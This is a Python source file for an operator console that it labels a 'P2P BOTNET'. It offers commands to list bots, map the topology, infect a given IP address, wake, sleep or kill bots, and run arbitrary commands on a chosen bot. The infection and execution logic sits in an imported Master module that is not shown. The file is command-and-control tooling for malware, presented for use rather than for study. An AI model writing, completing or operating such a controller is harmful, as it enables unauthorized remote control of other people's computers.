from master import Master
from subprocess import call, Popen, PIPE, STDOUT
from cmd import Cmd


master = Master()

class MyPrompt(Cmd):

    def do_show(self, inp):
        global master
        if inp == "bots":
            print('#########################')
            print('##### LIST OF BOTS ######')
            print('#########################')
            for bot in master.bootstrap_list.keys():
                if master.bootstrap_list[bot] == 1:
                    status = "Ready"
                elif master.bootstrap_list[bot] == 0:
                    status = "Asleep"
                else:
                    status = "Unreachable"
                print ("{} ----------> {}".format(bot, status))
        elif "topo" == inp:
            master.topology(None)
        elif "topo" in  inp:
            inp = inp.split(' ')
            ip = inp[1]
            master.topology(ip)


    def do_update(self, inp):
        global master
        master.update()

    def do_infect(self, ip_addr):
        global master
        print("infecting ", ip_addr)
        master.infect(ip_addr)

    def do_wakeup(self, ip_addr):
        global master
        master.bootstrap(ip_addr)

    def do_sleep(self, ip_addr):
        global master
        master.sleep(ip_addr)

    def do_execute(self, inp):
        global master
        inp = inp.split("'")
        cmd = inp[1]
        ip = inp[2].strip()
        print("Executing command {} in {}".format(inp[1], ip))
        master.execute(cmd, ip)

    def do_kill(self, inp):
        global master
        print("Killing bot at {}".format(inp))
        master.kill(inp)

    def do_exit(self, inp):
        print("Bye")
        return True

    def default(self, inp):
        if inp == 'x' or inp == 'q':
            return self.do_exit(inp)



def main():

    call(["toilet", "P2P BOTNET"])
    welcome = "toilet -f future 'Welcome Master' | boxes -d cat -a hc -p h1 | lolcat"
    cat_ps = Popen(welcome,shell=True,stdout=PIPE,stderr=STDOUT)
    output = cat_ps.communicate()[0]
    print (output)
    shell = MyPrompt()
    shell.cmdloop()


if __name__ == "__main__":
    main()
